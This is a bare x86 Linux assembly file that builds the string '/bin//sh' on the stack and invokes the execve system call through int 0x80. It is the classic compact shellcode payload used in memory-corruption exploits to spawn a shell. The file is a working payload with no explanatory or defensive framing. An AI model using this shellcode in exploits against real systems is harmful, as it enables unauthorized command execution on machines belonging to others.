.intel_syntax noprefix 
.globl _start 

_start:
    xor ecx, ecx 
    push 0xb 
    pop eax 
    push ecx 
    push 0x68732f2f # b'//sh'
    push 0x6e69622f # b'/bin'
    mov ebx, esp 
    mov edx, ecx 
    int 0x80
